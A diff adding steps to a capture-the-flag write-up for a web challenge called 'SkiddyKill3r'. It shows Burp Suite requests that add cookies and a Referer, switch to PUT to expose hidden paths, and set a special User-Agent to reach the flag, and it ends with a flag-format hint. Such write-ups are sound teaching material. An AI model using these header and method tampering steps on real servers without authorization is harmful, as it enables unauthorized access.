@@ -106,3 +106,115 @@ Cache-Control: max-age=0
 #### let's move to `http://52.28.216.196/skiddy/robots.txt`
 
 ![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts6.png)
+
+#### let's go to `http://52.28.216.196/skiddy/flag.php`
+
+![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts8.png)
+
+### Nothing... let's move to flag1.jpg
+
+![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/flag1.jpg)
+
+### Nothing too :)
+
+### Finally to `http://52.28.216.196/skiddy/robots.txt.php`
+
+![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts9.png)
+
+## Forbidden :) do you feel that you give up??
+### WAIT... LET'S GO TO BURPSUITE
+#### i'll send a request to `/skiddy/robots.txt.php`
+### The Request will be
+```
+GET /skiddy/robots.txt.php HTTP/1.1
+Host: 52.28.216.196
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+### oki let's be creative thinkers...
+#### we have to add the flag and flag1 cookies
+```
+GET /skiddy/robots.txt.php HTTP/1.1
+Host: 52.28.216.196
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: flag=NOOPCJF;flag1=MMHUWUV
+```
+
+### but no response we can add Referer
+
+```
+GET /skiddy/robots.txt.php HTTP/1.1
+Host: 52.28.216.196
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://52.28.216.196/skiddy/robots.txt.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: flag=NOOPCJF;flag1=MMHUWUV
+```
+
+### oki there's no response so we can change the HTTP Request Method
+
+### it's will be this one
+
+```
+PUT /skiddy/robots.txt.php HTTP/1.1
+Host: 52.28.216.196
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://52.28.216.196/skiddy/robots.txt.php
+Connection: close
+Upgrade-Insecure-Re
+quests: 1
+Cookie: flag=NOOPCJF;flag1=MMHUWUV
+```
+
+### I use `PUT` and the response will be:
+
+```
+Array
+(
+    [0] => User-agent: *
+    [1] => Disallow: /flag.php
+    [2] => Allow: /
+    [3] => Allow: /index.php
+    [4] => Allow: /real_flag.php
+    [5] => Allow: /user_check.php
+    [6] => User Agent :- G3t_My_Fl@g_N0w()
+    [7] => Try To Access user_check File
+)
+```
+
+### Oki so the flag will be in /user_check.php and the User Agent= G3t_My_Fl@g_N0w()
+
+```
+GET /skiddy/user_check.php HTTP/1.1
+Host: 52.28.216.196
+User-Agent: G3t_My_Fl@g_N0w()
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://52.28.216.196/skiddy/robots.txt.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: flag=NOOPCJF;flag1=MMHUWUV
+```
+
+# it will respnse and give you the FLAG...
+## Hope you got it
+### Hint
+#### Flag Format: **xyYXyyy{Yxyx_Yx_Yyyx_Yxy_Yxy}**
